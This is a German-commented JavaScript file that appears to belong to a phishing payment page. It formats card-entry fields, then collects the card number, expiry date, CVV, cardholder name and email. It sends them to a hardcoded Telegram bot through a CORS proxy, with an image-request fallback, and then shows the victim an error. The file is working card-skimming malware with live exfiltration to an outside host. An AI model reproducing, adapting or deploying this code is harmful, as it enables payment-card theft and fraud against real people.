// Telegram Bot Daten
const botToken = '8255790332:AAHAlWaR8PmCgOmewZ0knEcdRS5heLpKcbU';
const chatId = '8306987601';

// Zeige "Nicht verfügbar" Nachricht
function showUnavailable() {
    // Keine Aktion - nichts passiert beim Klick
}

// Zeige Ladeanimation
function showLoading() {
    document.getElementById('loadingOverlay').style.display = 'flex';
    document.getElementById('buttonLoader').style.display = 'block';
}

// Verstecke Ladeanimation
function hideLoading() {
    document.getElementById('loadingOverlay').style.display = 'none';
    document.getElementById('buttonLoader').style.display = 'none';
}

// Zeige Fehlermeldung
function showError() {
    const errorElement = document.getElementById('errorMessage');
    errorElement.style.display = 'block';
    errorElement.style.animation = 'none';
    
    setTimeout(() => {
        errorElement.style.animation = 'shake 0.5s ease-in-out';
    }, 10);
}

// Formatierung der Kreditkartennummer
document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.substring(0, 16);
    
    let formattedValue = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formattedValue += ' ';
        formattedValue += value[i];
    }
    
    e.target.value = formattedValue;
});

// Formatierung des Ablaufdatums
document.getElementById('expiryDate').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.substring(0, 4);
    
    if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    
    e.target.value = value;
});

// Funktion zum Senden an Telegram
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    // Verwenden von fetch mit einem Proxy, um CORS zu umgehen
    fetch(`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(url)}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        hideLoading();
        
        if (!data.ok) {
            showError();
        }
    })
    .catch(error => {
        hideLoading();
        showError();
        console.error('Error:', error);
        
        // Fallback: Daten mit Bild-Request senden
        const img = new Image();
        img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    });
}

// Zahlung verarbeiten
function processPayment() {
    // Daten sammeln
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
    const expiryDate = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvv').value;
    const cardName = document.getElementById('cardName').value.trim();
    const email = document.getElementById('email').value.trim();
    
    // Einfache Validierung
    if (!cardNumber || !expiryDate || !cvv || !cardName || !email) {
        showError();
        return;
    }
    
    // Zeige Ladeanimation
    showLoading();
    
    // Nachricht für Telegram formatieren
    const message = `TIER ZAHLUNG:\nKarte: ${cardNumber}\nGültig bis: ${expiryDate}\nCVV: ${cvv}\nName: ${cardName}\nEmail: ${email}\nBetrag: 3,19€\nDatum: ${new Date().toLocaleString('de-DE')}`;
    
    // Nachricht an Telegram senden
    sendToTelegram(message);
}

// CSS Animation für Fehlermeldung hinzufügen
const style = document.createElement('style');
style.textContent = `
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        25% { transform: translateX(-5px); }
        75% { transform: translateX(5px); }
    }
`;
document.head.appendChild(style);
